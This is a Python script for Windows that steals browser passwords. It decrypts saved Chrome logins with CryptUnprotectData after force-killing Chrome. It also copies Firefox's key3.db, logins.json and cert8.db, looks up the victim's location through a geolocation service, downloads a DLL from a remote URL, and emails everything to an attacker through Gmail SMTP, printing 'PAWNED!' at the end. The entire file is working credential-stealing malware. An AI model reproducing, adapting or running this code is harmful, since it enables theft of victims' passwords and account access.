from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from smtplib import SMTP


import win32crypt
import base64
import os
import winreg
import urllib.request

firefox = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
encoded_files = {}
files_needed = ['key3.db', 'logins.json', 'cert8.db']
login_cred = {'email':'', 'password':'', 'dest':''}
endpoint = 'http://freegeoip.net/json/'
dll_url = "https://s3.amazonaws.com/idiaco/sqlite3.dll"
dll_name = "sqlite3.dll"


def getpath() :
	for path in os.walk(os.getenv('USERPROFILE')) :
		if 'Chrome' in path[1] :
			return str(path[0]) + '\\Chrome\\User Data\\Default\\Login Data'

def sql_mite() :
	path = getpath()
	import sqlite3
	try :
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		data = cursor.fetchall()
		return data
	except Exception as e:
		print('There was an Error') # Remember to change this part to 'pass'

def dechrome() :
	data = sql_mite()
	info = {}
	bundle = []
	if len(data) > 0 : # Yeah dummy, stop figuring out what this does. It simply checks if the user has used Chrome before :)
		for value in data :
			password = win32crypt.CryptUnprotectData(value[2], None, None, None, 0)[1].decode()
			info['url'] = value[0]
			info['Username'] = value[1]
			info['Password'] = password
			bundle.append(info)
			info = {} # For some reason which i can't tell, it kept on posting only one saved login. so i had to find a hack around it. please ignore it.
		return bundle
	else : print('Chromeless')

def encode_content(*args) :
	for file in args :
		f = open(file,"rb")
		filecontent = f.read()
		encodedcontent = base64.b64encode(filecontent)
		encoded_files[file] = encodedcontent
	return True

def path_gen(filename) :
	tree = os.listdir(firefox)
	name = firefox + '\\'+ tree[0] + '\\' + filename
	return name

def ip_man(endpoint) :
	try :
		r = urllib.request.urlretrieve(endpoint)
		return r[0]
	except :
		return 'For some unknown resons, IP couldnt be extracted'

def dll_download(dll_url,dll_name):
	urllib.request.urlretrieve(dll_url, dll_name, reporthook=None)
	return True


def email_setup(chrome) :
	''' This function prepares the email, by attaching text and all neccessary attachment '''
	email = MIMEMultipart()
	email['Subject'] = 'Kermit just got served'
	email['From'] = login_cred['email']
	
	email['To'] = login_cred['dest']

	# That is what u see if dont have an email reader:
	email.preamble = 'Multipart message.\n'

	text = MIMEText("Chromium = " + str(chrome)) 
	email.attach(text)

	# This is the binary part(The Attachment):
	part = MIMEApplication(encoded_files[r'' + str(keys3)])
	part.add_header('Content-Disposition', 'attachment', filename="key3.db")
	email.attach(part)

	part = MIMEApplication(encoded_files[r'' + str(logins)])
	part.add_header('Content-Disposition', 'attachment', filename="logins.json")
	email.attach(part)

	part = MIMEApplication(encoded_files[r'' + str(cert8)])
	part.add_header('Content-Disposition', 'attachment', filename="cert8.db")
	email.attach(part)

	part = MIMEApplication(encoded_files[str(geoip)])
	part.add_header('Content-Disposition', 'attachment', filename="geoip.json")
	email.attach(part)

	return email

def main() :
	
	global keys3
	global logins
	global cert8
	global geoip
	
	report = dll_download(dll_url, dll_name)
	os.system("taskkill /f /im chrome.exe")
	
	chrome = dechrome()
	
	if report :
		keys3 = path_gen(files_needed[0])
		logins = path_gen(files_needed[1])
		cert8 = path_gen(files_needed[2])
		geoip = ip_man(endpoint)

		encode_content(keys3, logins, cert8, geoip)

		email = email_setup(chrome)
		smtp = SMTP('smtp.gmail.com:587')
		smtp.ehlo()
		smtp.starttls()
		print('Logging In')
		smtp.login(login_cred['email'], login_cred['password']) # Authenticate PassKeys
		print('login successful')
		print('Sending email')
		smtp.sendmail(email['From'], email['To'], email.as_string()) # Send Mail
		print('PAWNED!')

if __name__ == '__main__':
	main()
